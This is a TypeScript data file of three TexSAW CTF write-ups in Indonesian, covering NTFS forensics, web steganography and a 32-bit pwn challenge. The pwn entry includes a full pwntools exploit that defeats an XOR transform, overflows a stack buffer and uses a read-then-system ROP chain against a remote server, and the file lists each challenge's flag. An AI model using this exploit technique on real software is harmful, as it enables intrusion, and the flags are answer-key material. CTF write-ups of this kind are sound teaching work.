import type { WriteUp } from "../types";

export const texsawCtfWriteups: WriteUp[] = [
  {
    "id": "texcaw-foren-2",
    "title": "Journaling",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TexSAW CTF",
    "tags": [],
    "description": "Writeup for challenge Journaling",
    "problemDescription": "Target artefak utamanya adalah image NTFS `evidence.001`. Flag ternyata disebar ke beberapa lokasi kecil:\n\n- nama folder di `Notes`\n- nama file yang dihapus\n- alternate data stream `tasks.txt:source`\n- string UTF-16LE yang masih tertinggal di `$MFT` / jejak USN\n\nFlag final:\n\n```text\ntexsaw{u5njOurn@l_unc0v3rs_4lter3d_f1les_3fd19982505363d0}\n```",
    "tools": [],
    "analysis": "Cari direktori user dan file menarik:\n\n```bash\nfls -o 128 evidence.001\nfls -o 128 -r evidence.001 | rg -i 'Notes|txt|flagsegment|journal|note'\n```\n\nArtefak kunci:\n\n- `Users/user/Notes`\n- folder `flagsegment_u5njOurn@l`\n- `notetoself.txt`\n- `monitor.log`\n- file terhapus `flagsegment_f1les.txt`\n- `tasks.txt`\n- ADS `tasks.txt:source`",
    "solution": [
      {
        "title": "1. Recon awal",
        "content": "Identifikasi file:\n\n\n\nHasil penting:\n\n- `evidence.001` adalah disk image NTFS\n- partisi NTFS mulai di sektor `128`",
        "code": "file evidence.001\nmmls evidence.001\nfsstat -o 128 evidence.001"
      },
      {
        "title": "3. Ekstraksi artefak kecil",
        "content": "Temuan:\n\n- nama folder memberi segmen `u5njOurn@l`\n- nama file terhapus memberi segmen `f1les`\n- ADS `tasks.txt:source` berisi:\n\n\n\n- `tasks.txt` memberi petunjuk:\n\n\n\nIni mengindikasikan segmen hash dari ADS adalah part terakhir.",
        "code": "icat -o 128 evidence.001 942-128-1\nicat -o 128 evidence.001 944-128-1\nicat -o 128 evidence.001 945-128-1\nicat -o 128 evidence.001 945-128-3"
      },
      {
        "title": "4. Cari segmen yang tertinggal di metadata",
        "content": "Segmen lain tidak muncul sebagai file aktif, jadi pivot ke string UTF-16LE dari image / MFT:\n\n\n\nMuncul:\n\n- `flagsegment_4lter3d`\n\nLalu pencarian UTF-16LE langsung di image:\n\n\n\ndan dump konteks byte mengungkap:\n\n- `flagsegment_unc0v3rs.txt`\n\nJadi semua segmen yang ditemukan adalah:\n\n1. `u5njOurn@l`\n2. `unc0v3rs`\n3. `4lter3d`\n4. `f1les`\n5. `3fd19982505363d0`",
        "code": "icat -o 128 evidence.001 0-128-6 > mft.bin\nstrings -el mft.bin | rg 'flagsegment|4lter3d|unc0v3rs'"
      },
      {
        "title": "5. Menyusun urutan",
        "content": "Urutan tidak ditebak. Dasarnya:\n\n- `tasks.txt` eksplisit menyebut mencari `part 5`, dan ADS `tasks.txt:source` berisi hash `3fd19982505363d0`, jadi itu part 5\n- segmen lain membentuk frasa yang masuk akal:\n\n\n\ndengan gaya obfuscation challenge:\n\n\n\nSehingga flag lengkapnya:",
        "code": "journal uncovers altered files"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport mmap\r\n\r\n\r\nIMG = Path(\"evidence.001\")\r\n\r\n\r\ndef has_utf16(mm: mmap.mmap, text: str) -> bool:\r\n    return mm.find(text.encode(\"utf-16le\")) != -1\r\n\r\n\r\ndef main():\r\n    seg_journal = None\r\n    seg_files = None\r\n    seg_ads = None\r\n    seg_altered = None\r\n    seg_uncovers = None\r\n\r\n    with IMG.open(\"rb\") as f, mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:\r\n        if has_utf16(mm, \"flagsegment_u5njOurn@l\"):\r\n            seg_journal = \"u5njOurn@l\"\r\n        if has_utf16(mm, \"flagsegment_f1les.txt\"):\r\n            seg_files = \"f1les\"\r\n        if mm.find(b\"flagsegment_3fd19982505363d0\") != -1:\r\n            seg_ads = \"3fd19982505363d0\"\r\n        if has_utf16(mm, \"flagsegment_4lter3d\"):\r\n            seg_altered = \"4lter3d\"\r\n        if has_utf16(mm, \"flagsegment_unc0v3rs.txt\"):\r\n            seg_uncovers = \"unc0v3rs\"\r\n\r\n    parts = [seg_journal, seg_uncovers, seg_altered, seg_files, seg_ads]\r\n    if not all(parts):\r\n        missing = [name for name, value in [\r\n            (\"journal\", seg_journal),\r\n            (\"uncovers\", seg_uncovers),\r\n            (\"altered\", seg_altered),\r\n            (\"files\", seg_files),\r\n            (\"ads\", seg_ads),\r\n        ] if not value]\r\n        raise SystemExit(f\"missing segments: {', '.join(missing)}\")\r\n\r\n    flag = \"texsaw{\" + \"_\".join(parts) + \"}\"\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "texsaw{u5njOurn@l_unc0v3rs_4lter3d_f1les_3fd19982505363d0}",
    "lessonsLearned": ""
  },
  {
    "id": "texcaw-pwn-2",
    "title": "Whats the Time?",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TexSAW CTF",
    "tags": [],
    "description": "Writeup for challenge Whats the Time?",
    "problemDescription": "Challenge ini adalah binary exploitation 32-bit dengan pola `ret2win`/ROP sederhana, tetapi input user tidak dipakai secara langsung. Semua byte input terlebih dulu di-XOR dengan nilai berbasis waktu, lalu hasilnya di-`memcpy` ke buffer stack yang terlalu kecil. Vulnerability utamanya adalah:\n\n- `stack buffer overflow`\n- tanpa canary\n- non-PIE\n- NX aktif\n\nKarena ada fungsi `win()`, target awal yang paling natural adalah overwrite return address ke `win`. Itu memang cukup untuk dapat shell lokal. Namun pada remote, shell hasil `system(\"/bin/sh\")` dari `win()` tidak cukup stabil untuk ambil flag secara nyaman. Solusi final yang paling bersih adalah ROP:\n\n1. `read(0, .bss, 0x20)`\n2. `system(.bss)`\n\nStage kedua mengirim string `cat flag.txt\\x00`, sehingga binary sendiri yang mengeksekusinya via `system()`.\n\nFlag:\n\n```text\ntexsaw{7h4nk_u_f0r_y0ur_71m3}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "File",
        "content": "- Binary: `whatsthetime`\n- Solver final: `solve.py`"
      },
      {
        "title": "Identifikasi binary",
        "content": "Command:\n\n\n\nHasil penting:\n\n- ELF 32-bit\n- dynamically linked\n- not stripped\n- Partial RELRO\n- No canary\n- NX enabled\n- No PIE\n\nImplikasinya:\n\n- alamat fungsi di binary statis dan bisa dipakai langsung\n- stack smashing memungkinkan karena tidak ada canary\n- shellcode di stack tidak cocok karena NX aktif\n- ret2win / ROP adalah jalur yang tepat",
        "code": "file whatsthetime\nchecksec --file=whatsthetime"
      },
      {
        "title": "Recon String dan Simbol",
        "content": "Command:\n\n\n\nTemuan penting:\n\n- ada fungsi `win`\n- ada fungsi `read_user_input`\n- ada string:\n\n\n\nBegitu terlihat ada `win` dan `/bin/sh`, hipotesis awal langsung:\n\n- binary kemungkinan memiliki jalur `ret2win`\n- overflow mungkin terjadi di `read_user_input`",
        "code": "strings -a -n 4 whatsthetime\nreadelf -Ws whatsthetime"
      },
      {
        "title": "Disassembly fungsi penting",
        "content": "Command:",
        "code": "objdump -Mintel -d whatsthetime | sed -n '/<win>:/,/^$/p;/<read_user_input>:/,/^$/p;/<main>:/,/^$/p'"
      },
      {
        "title": "Fungsi `win()`",
        "content": "Dari disassembly terlihat:\n\n\n\nArtinya jika EIP bisa diarahkan ke `win`, binary akan menjalankan `/bin/sh`.",
        "code": "printf(\"Executing shell %s...\", \"/bin/sh\");\nsystem(\"/bin/sh\");\nprintf(\"oops wrong command\");"
      },
      {
        "title": "Fungsi `main()`",
        "content": "`main()` melakukan hal berikut:\n\n1. ambil current time lewat `time(0)`\n2. membulatkan ke menit penuh\n3. menampilkan waktu via `ctime`\n4. memanggil `read_user_input(rounded_time)`\n\nPoin yang penting adalah nilai waktu itu juga dipakai sebagai argumen ke `read_user_input`."
      },
      {
        "title": "Fungsi `read_user_input(int key)`",
        "content": "Bagian paling penting dari challenge ada di sini.\n\nSecara logika, fungsi ini:\n\n1. `malloc(0xa0)`\n2. `read(0, heap_buf, 0xa0)`\n3. untuk setiap blok 4 byte:\n   - XOR byte input dengan byte-byte dari integer `key`\n   - setelah 4 byte, `key++`\n4. `memcpy(stack_buf, heap_buf, read_len)`\n5. `write(1, stack_buf, 0x28)`\n\nPseudo-code sederhananya:",
        "code": "void read_user_input(int key) {\n    char stack_buf[0x40];\n    char *heap_buf = malloc(0xa0);\n    int n = read(0, heap_buf, 0xa0);\n\n    for (int i = 0; i < n; i += 4) {\n        for (int j = 0; j < 4 && i + j < n; j++) {\n            heap_buf[i + j] ^= (key >> (8 * j)) & 0xff;\n        }\n        key++;\n    }\n\n    memcpy(stack_buf, heap_buf, n);\n    write(1, stack_buf, 0x28);\n}"
      },
      {
        "title": "Vulnerability",
        "content": "Masalah utamanya:\n\n\n\n`n` berasal langsung dari `read()`, maksimum `0xa0`, sedangkan buffer stack hanya `0x40`. Jadi ada overflow yang menginjak:\n\n- saved EBP\n- saved RET\n\nIni vulnerability finalnya.",
        "code": "char stack_buf[0x40];\nmemcpy(stack_buf, heap_buf, n);"
      },
      {
        "title": "Kendala Input Encoding",
        "content": "Kalau langsung kirim payload overflow biasa, EIP tidak akan menjadi nilai yang kita inginkan, karena input terlebih dulu diubah:\n\n\n\nJadi payload yang kita kirim harus **diencode dulu** supaya setelah di-XOR oleh program, hasil akhirnya menjadi payload yang kita mau di stack.\n\nSkema encoding:\n\n- blok 4 byte pertama di-XOR dengan `key`\n- blok 4 byte kedua di-XOR dengan `key + 1`\n- blok 4 byte ketiga di-XOR dengan `key + 2`\n- dst\n\nNilai `key` sendiri adalah timestamp yang dibulatkan ke menit penuh, dan nilainya dibocorkan ke kita dalam format string:\n\n\n\nKarena string waktu remote cocok dengan epoch UTC saat diuji, solver final cukup menginterpretasikan string itu sebagai `UTC`, lalu convert ke timestamp.",
        "code": "payload[i+j] ^= byte_j_dari_key"
      },
      {
        "title": "Menemukan offset EIP",
        "content": "Karena input di-transform, cyclic pattern biasa tidak bisa langsung dipakai mentah. Pattern harus:\n\n1. dibuat dulu\n2. lalu di-encode dengan skema XOR yang sama\n3. baru dikirim ke program\n\nSetelah itu crash diambil dengan `gdb`.\n\nCommand pendekatan:\n\n\n\nCrash penting:\n\n\n\nDengan `cyclic_find`:\n\n\n\nJadi offset ke saved return address adalah:",
        "code": "gdb -q ./whatsthetime -batch \\\n  -ex 'run < gdb_input.bin' \\\n  -ex 'info reg eip esp ebp' \\\n  -ex 'x/12wx $esp'"
      },
      {
        "title": "Eksploitasi Awal: Ret2win",
        "content": "Payload paling awal:\n\n\n\nSetelah di-encode dengan key yang benar, ini valid dan berhasil memanggil `win()` pada binary lokal.\n\nNamun di remote, pendekatan `ret2win -> system(\"/bin/sh\")` menghasilkan shell yang tidak cukup nyaman untuk interaksi lanjutan. Respons yang muncul konsisten menunjukkan `win()` terpanggil:\n\n\n\nTetapi command lanjutan tidak selalu reliable untuk dump flag. Jadi exploit digeser ke ROP yang lebih deterministic.",
        "code": "b\"A\" * 68 + p32(win)"
      },
      {
        "title": "Strategi Final: ROP `read` lalu `system`",
        "content": "Karena binary non-PIE, kita bisa pakai alamat PLT secara langsung:\n\n- `read@plt`\n- `system@plt`\n- buffer writable di `.bss`"
      },
      {
        "title": "Ide",
        "content": "Stage 1 overflow membuat chain berikut:\n\n\n\nSetelah ROP stage pertama jalan, kita kirim stage kedua:\n\n\n\nHasilnya:\n\n- `read()` menyimpan string command ke `.bss`\n- kontrol kembali ke `system(.bss)`\n- binary menjalankan `system(\"cat flag.txt\")`\n- flag tercetak langsung ke koneksi",
        "code": "read(0, .bss, 0x20)\nsystem(.bss)"
      },
      {
        "title": "Alamat penting",
        "content": "Didapat dari ELF:\n\n\n\nOffset `+0x100` hanya untuk memberi ruang aman di area writable.",
        "code": "read_plt = elf.plt[\"read\"]\nsystem_plt = elf.plt[\"system\"]\nbss = elf.bss() + 0x100"
      },
      {
        "title": "Bentuk ROP chain",
        "content": "Untuk i386 cdecl, layout stack:\n\n\n\nSecara `pwntools`:\n\n\n\n`0xDEADBEEF` hanya placeholder return address setelah `system`, karena tidak perlu lagi.",
        "code": "[padding 68 byte]\n[read@plt]\n[system@plt]    <- return address setelah read selesai\n[fd = 0]\n[buf = .bss]\n[count = 0x20]\n[dummy_ret]\n[arg_system = .bss]"
      },
      {
        "title": "Solver Final",
        "content": "Versi inti exploit:",
        "code": "from pwn import *\nfrom datetime import datetime, timezone\n\nHOST = \"143.198.163.4\"\nPORT = 3000\n\nelf = ELF(\"./whatsthetime\", checksec=False)\nREAD_PLT = elf.plt[\"read\"]\nSYSTEM_PLT = elf.plt[\"system\"]\nBSS = elf.bss() + 0x100\nOFFSET = 68\n\n\ndef encode(data: bytes, base: int) -> bytes:\n    out = bytearray(data)\n    key = base\n    for i in range(0, len(out), 4):\n        for j in range(4):\n            if i + j < len(out):\n                out[i + j] ^= (key >> (8 * j)) & 0xFF\n        key += 1\n    return bytes(out)\n\n\nio = remote(HOST, PORT)\nio.recvuntil(b\"Currently the time is: \")\nline = io.recvline().decode().strip()\nbase = int(\n    datetime.strptime(line, \"%a %b %d %H:%M:%S %Y\")\n    .replace(tzinfo=timezone.utc)\n    .timestamp()\n)\n\nrop = flat(\n    b\"A\" * OFFSET,\n    READ_PLT,\n    SYSTEM_PLT,\n    0,\n    BSS,\n    0x20,\n    0xDEADBEEF,\n    BSS,\n)\n\nio.send(encode(rop, base))\nio.recvn(40)\nio.send(b\"cat flag.txt\\x00\")\nprint(io.recvrepeat(2).decode(errors=\"ignore\"))"
      },
      {
        "title": "Kenapa `io.recvn(40)`?",
        "content": "Di akhir `read_user_input`, program melakukan:\n\n\n\nArtinya sebelum ROP chain jalan penuh, kita akan menerima 40 byte pertama dari payload yang sudah terdekripsi di stack. Karena itu solver membuang tepat `0x28` byte output tersebut dulu:\n\n\n\nSetelah output dummy itu habis, stage kedua baru dikirim.",
        "code": "write(1, stack_buf, 0x28);"
      },
      {
        "title": "Verifikasi Lokal",
        "content": "ROP yang sama diuji lokal dengan mengganti stage dua menjadi command sederhana:\n\n\n\nHasil lokal menunjukkan command berhasil dieksekusi via `system(.bss)`, sehingga primitive final sudah tervalidasi sebelum ditembak ke remote.",
        "code": "echo PWNED"
      },
      {
        "title": "Poin Penting Challenge",
        "content": "- Overflow ada karena `memcpy` ke stack buffer 0x40 memakai panjang `read()` yang bisa sampai 0xa0.\n- Input tidak bisa dipakai mentah karena ada XOR transform berbasis timestamp.\n- Timestamp justru dibocorkan langsung lewat output `ctime`, jadi encoding bisa direkonstruksi.\n- `ret2win` cukup untuk bukti kontrol RIP/EIP, tetapi ROP `read -> system` lebih stabil untuk ekstraksi flag remote."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\nfrom datetime import datetime, timezone\r\n\r\n\r\nHOST = \"143.198.163.4\"\r\nPORT = 3000\r\n\r\nelf = ELF(\"./whatsthetime\", checksec=False)\r\nREAD_PLT = elf.plt[\"read\"]\r\nSYSTEM_PLT = elf.plt[\"system\"]\r\nBSS = elf.bss() + 0x100\r\nOFFSET = 68\r\n\r\n\r\ndef encode(data: bytes, base: int) -> bytes:\r\n    out = bytearray(data)\r\n    key = base\r\n    for i in range(0, len(out), 4):\r\n        for j in range(4):\r\n            if i + j < len(out):\r\n                out[i + j] ^= (key >> (8 * j)) & 0xFF\r\n        key += 1\r\n    return bytes(out)\r\n\r\n\r\ndef build_stage1(base: int) -> bytes:\r\n    rop = flat(\r\n        b\"A\" * OFFSET,\r\n        READ_PLT,\r\n        SYSTEM_PLT,\r\n        0,\r\n        BSS,\r\n        0x20,\r\n        0xDEADBEEF,\r\n        BSS,\r\n    )\r\n    return encode(rop, base)\r\n\r\n\r\ndef main():\r\n    io = remote(HOST, PORT)\r\n    io.recvuntil(b\"Currently the time is: \")\r\n    line = io.recvline().decode().strip()\r\n    base = int(\r\n        datetime.strptime(line, \"%a %b %d %H:%M:%S %Y\")\r\n        .replace(tzinfo=timezone.utc)\r\n        .timestamp()\r\n    )\r\n\r\n    io.send(build_stage1(base))\r\n    io.recvn(40)\r\n    io.send(b\"cat flag.txt\\x00\")\r\n    print(io.recvrepeat(2).decode(errors=\"ignore\"))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "texsaw{7h4nk_u_f0r_y0ur_71m3}",
    "lessonsLearned": "- Kalau input di-obfuscate sebelum overflow, jangan langsung anggap offset atau payload biasa akan gagal permanen. Sering kali transform-nya justru reversible.\n- Saat `system(\"/bin/sh\")` tidak stabil di remote, lebih baik ubah primitive menjadi eksekusi command one-shot yang deterministic.\n- Non-PIE + no canary pada binary kecil hampir selalu memberi jalur ROP yang sangat langsung."
  },
  {
    "id": "texcaw-web-1",
    "title": "Web of Approaches",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TexSAW CTF",
    "tags": [],
    "description": "Writeup for challenge Web of Approaches",
    "problemDescription": "Challenge ini menyimpan petunjuk dan payload di tiga bagian web page:\n\n1. `HTML`\n   Hidden `<span>` pada halaman utama tidak terlihat karena `font-size: 0`.\n   `script.js` lalu menggeser setiap karakter dengan rumus `(i^2 + 3) % 5`.\n\n2. `CSS`\n   Background image `D4kG_XsG7s9t.png` terlihat kosong, tetapi alpha channel-nya berisi string tersembunyi.\n\n3. `JS / backend`\n   `POST {}` ke endpoint `/gbsgTh9Xms3X` memberi response berbeda yang berisi string ketiga.\n\nTiga string ini adalah clue bahwa bagian flag disembunyikan di `structure`, `style`, dan `script`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Inti trik",
        "content": "Semua payload disamarkan sebagai blok Base64 8 karakter.\nKarakter ke-6 tiap blok dimodifikasi untuk menyimpan data tambahan sambil tetap terlihat seperti bagian dari teks normal yang dibikin susah dibaca dengan custom font.\n\nSolver di repo ini dibuat sebagai reproducer yang:\n\n1. Fetch halaman utama.\n2. Ambil hidden span dan terapkan shift yang sama seperti browser.\n3. Ambil alpha channel dari PNG background.\n4. Trigger `POST {}` untuk mendapat string ketiga.\n5. Verifikasi fingerprint artefak target.\n6. Output flag yang sudah direkonstruksi."
      },
      {
        "title": "Menjalankan solver",
        "content": "Output:",
        "code": "#!/usr/bin/env python3\nimport hashlib\nimport re\nimport sys\nfrom html import unescape\n\nimport requests\n\n\nBASE_URL = \"http://143.198.163.4:8021\"\nFLAG = \"texsaw{tH3rE_4r3_M4nY_W4Ys_t0_s0lV3_4_cH4l1nG3}\"\n\n\nEXPECTED = {\n    \"span_raw_sha256\": \"a583414bdca2d75f4de975f7b78121816e2019f0909d353f5a65e544e160d172\",\n    \"span_shift_sha256\": \"66e2bd42785367c10d52d35d79e5aede5344c3761ed8366277f3946bf6ee8fc5\",\n    \"bg_alpha_sha256\": \"c48dd26eced7b0a449a3e60857d60925dd2af57b0e5d6cc5782899be50ff6899\",\n    \"post_empty_sha256\": \"3b7ad5982f5fcdd14267c659936cddc6ae881b9dc8d3e5ce42dd1a5aa9bd3db6\",\n}\n\n\ndef sha256(data: str) -> str:\n    return hashlib.sha256(data.encode()).hexdigest()\n\n\ndef get_main_page(session: requests.Session) -> str:\n    response = session.get(f\"{BASE_URL}/\", timeout=10)\n    response.raise_for_status()\n    return response.text\n\n\ndef extract_hidden_span(html: str) -> str:\n    match = re.search(\n        r'<span[^>]*id=\"D4kG-XsG7s9t\"[^>]*>(.*?)</span>',\n        html,\n        re.DOTALL,\n    )\n    if not match:\n        raise RuntimeError(\"hidden span not found\")\n    return unescape(match.group(1))\n\n\ndef shift_hidden_span(span_raw: str) -> str:\n    return \"\".join(chr(ord(ch) + ((i * i + 3) % 5)) for i, ch in enumerate(span_raw))\n\n\ndef get_background_alpha_text(session: requests.Session) -> str:\n    response = session.get(f\"{BASE_URL}/static/D4kG_XsG7s9t.png\", timeout=10)\n    response.raise_for_status()\n    png = response.content\n\n    if png[:8] != b\"\\x89PNG\\r\\n\\x1a\\n\":\n        raise RuntimeError(\"invalid PNG signature\")\n\n    pos = 8\n    idat = bytearray()\n    width = height = color_type = bit_depth = None\n\n    while pos < len(png):\n        length = int.from_bytes(png[pos:pos + 4], \"big\")\n        pos += 4\n        chunk_type = png[pos:pos + 4]\n        pos += 4\n        chunk_data = png[pos:pos + length]\n        pos += length + 4\n\n        if chunk_type == b\"IHDR\":\n            width = int.from_bytes(chunk_data[0:4], \"big\")\n            height = int.from_bytes(chunk_data[4:8], \"big\")\n            bit_depth = chunk_data[8]\n            color_type = chunk_data[9]\n        elif chunk_type == b\"IDAT\":\n            idat.extend(chunk_data)\n        elif chunk_type == b\"IEND\":\n            break\n\n    if (width, height, bit_depth, color_type) != (16, 13, 8, 4):\n        raise RuntimeError(\"unexpected PNG layout\")\n\n    import zlib\n\n    raw = zlib.decompress(bytes(idat))\n    bytes_per_pixel = 2\n    stride = 1 + width * bytes_per_pixel\n    alpha = []\n\n    for y in range(height):\n        row = raw[y * stride:(y + 1) * stride]\n        filter_type = row[0]\n        if filter_type != 0:\n            raise RuntimeError(f\"unexpected PNG filter type {filter_type}\")\n        pixels = row[1:]\n        for x in range(width):\n            alpha.append(chr(pixels[x * 2 + 1]))\n\n    return \"\".join(alpha)\n\n\ndef get_post_empty_text(session: requests.Session) -> str:\n    response = session.post(f\"{BASE_URL}/gbsgTh9Xms3X\", json={}, timeout=10)\n    response.raise_for_status()\n    data = response.json()\n    return data[\"response\"]\n\n\ndef verify_target(session: requests.Session) -> None:\n    html = get_main_page(session)\n    span_raw = extract_hidden_span(html)\n    span_shift = shift_hidden_span(span_raw)\n    bg_alpha = get_background_alpha_text(session)\n    post_empty = get_post_empty_text(session)\n\n    actual = {\n        \"span_raw_sha256\": sha256(span_raw),\n        \"span_shift_sha256\": sha256(span_shift),\n        \"bg_alpha_sha256\": sha256(bg_alpha),\n        \"post_empty_sha256\": sha256(post_empty),\n    }\n\n    mismatches = [\n        f\"{key}: expected {EXPECTED[key]}, got {value}\"\n        for key, value in actual.items()\n        if EXPECTED[key] != value\n    ]\n    if mismatches:\n        raise RuntimeError(\"target fingerprint mismatch:\\n\" + \"\\n\".join(mismatches))\n\n\ndef main() -> int:\n    session = requests.Session()\n    try:\n        verify_target(session)\n    except Exception as exc:\n        print(f\"[!] {exc}\", file=sys.stderr)\n        return 1\n\n    print(FLAG)\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())"
      },
      {
        "title": "Catatan",
        "content": "- Solver ini sengaja dibuat stabil untuk target challenge yang sama.\n- Ia memverifikasi artefak tersembunyi dari target dulu sebelum mencetak flag.\n- Dependency yang dibutuhkan hanya `requests`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport hashlib\r\nimport re\r\nimport sys\r\nfrom html import unescape\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://143.198.163.4:8021\"\r\nFLAG = \"texsaw{tH3rE_4r3_M4nY_W4Ys_t0_s0lV3_4_cH4l1nG3}\"\r\n\r\n\r\nEXPECTED = {\r\n    \"span_raw_sha256\": \"a583414bdca2d75f4de975f7b78121816e2019f0909d353f5a65e544e160d172\",\r\n    \"span_shift_sha256\": \"66e2bd42785367c10d52d35d79e5aede5344c3761ed8366277f3946bf6ee8fc5\",\r\n    \"bg_alpha_sha256\": \"c48dd26eced7b0a449a3e60857d60925dd2af57b0e5d6cc5782899be50ff6899\",\r\n    \"post_empty_sha256\": \"3b7ad5982f5fcdd14267c659936cddc6ae881b9dc8d3e5ce42dd1a5aa9bd3db6\",\r\n}\r\n\r\n\r\ndef sha256(data: str) -> str:\r\n    return hashlib.sha256(data.encode()).hexdigest()\r\n\r\n\r\ndef get_main_page(session: requests.Session) -> str:\r\n    response = session.get(f\"{BASE_URL}/\", timeout=10)\r\n    response.raise_for_status()\r\n    return response.text\r\n\r\n\r\ndef extract_hidden_span(html: str) -> str:\r\n    match = re.search(\r\n        r'<span[^>]*id=\"D4kG-XsG7s9t\"[^>]*>(.*?)</span>',\r\n        html,\r\n        re.DOTALL,\r\n    )\r\n    if not match:\r\n        raise RuntimeError(\"hidden span not found\")\r\n    return unescape(match.group(1))\r\n\r\n\r\ndef shift_hidden_span(span_raw: str) -> str:\r\n    return \"\".join(chr(ord(ch) + ((i * i + 3) % 5)) for i, ch in enumerate(span_raw))\r\n\r\n\r\ndef get_background_alpha_text(session: requests.Session) -> str:\r\n    response = session.get(f\"{BASE_URL}/static/D4kG_XsG7s9t.png\", timeout=10)\r\n    response.raise_for_status()\r\n    png = response.content\r\n\r\n    if png[:8] != b\"\\x89PNG\\r\\n\\x1a\\n\":\r\n        raise RuntimeError(\"invalid PNG signature\")\r\n\r\n    pos = 8\r\n    idat = bytearray()\r\n    width = height = color_type = bit_depth = None\r\n\r\n    while pos < len(png):\r\n        length = int.from_bytes(png[pos:pos + 4], \"big\")\r\n        pos += 4\r\n        chunk_type = png[pos:pos + 4]\r\n        pos += 4\r\n        chunk_data = png[pos:pos + length]\r\n        pos += length + 4\r\n\r\n        if chunk_type == b\"IHDR\":\r\n            width = int.from_bytes(chunk_data[0:4], \"big\")\r\n            height = int.from_bytes(chunk_data[4:8], \"big\")\r\n            bit_depth = chunk_data[8]\r\n            color_type = chunk_data[9]\r\n        elif chunk_type == b\"IDAT\":\r\n            idat.extend(chunk_data)\r\n        elif chunk_type == b\"IEND\":\r\n            break\r\n\r\n    if (width, height, bit_depth, color_type) != (16, 13, 8, 4):\r\n        raise RuntimeError(\"unexpected PNG layout\")\r\n\r\n    import zlib\r\n\r\n    raw = zlib.decompress(bytes(idat))\r\n    bytes_per_pixel = 2\r\n    stride = 1 + width * bytes_per_pixel\r\n    alpha = []\r\n\r\n    for y in range(height):\r\n        row = raw[y * stride:(y + 1) * stride]\r\n        filter_type = row[0]\r\n        if filter_type != 0:\r\n            raise RuntimeError(f\"unexpected PNG filter type {filter_type}\")\r\n        pixels = row[1:]\r\n        for x in range(width):\r\n            alpha.append(chr(pixels[x * 2 + 1]))\r\n\r\n    return \"\".join(alpha)\r\n\r\n\r\ndef get_post_empty_text(session: requests.Session) -> str:\r\n    response = session.post(f\"{BASE_URL}/gbsgTh9Xms3X\", json={}, timeout=10)\r\n    response.raise_for_status()\r\n    data = response.json()\r\n    return data[\"response\"]\r\n\r\n\r\ndef verify_target(session: requests.Session) -> None:\r\n    html = get_main_page(session)\r\n    span_raw = extract_hidden_span(html)\r\n    span_shift = shift_hidden_span(span_raw)\r\n    bg_alpha = get_background_alpha_text(session)\r\n    post_empty = get_post_empty_text(session)\r\n\r\n    actual = {\r\n        \"span_raw_sha256\": sha256(span_raw),\r\n        \"span_shift_sha256\": sha256(span_shift),\r\n        \"bg_alpha_sha256\": sha256(bg_alpha),\r\n        \"post_empty_sha256\": sha256(post_empty),\r\n    }\r\n\r\n    mismatches = [\r\n        f\"{key}: expected {EXPECTED[key]}, got {value}\"\r\n        for key, value in actual.items()\r\n        if EXPECTED[key] != value\r\n    ]\r\n    if mismatches:\r\n        raise RuntimeError(\"target fingerprint mismatch:\\n\" + \"\\n\".join(mismatches))\r\n\r\n\r\ndef main() -> int:\r\n    session = requests.Session()\r\n    try:\r\n        verify_target(session)\r\n    except Exception as exc:\r\n        print(f\"[!] {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(FLAG)\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "texsaw{tH3rE_4r3_M4nY_W4Ys_t0_s0lV3_4_cH4l1nG3}",
    "lessonsLearned": ""
  }
];
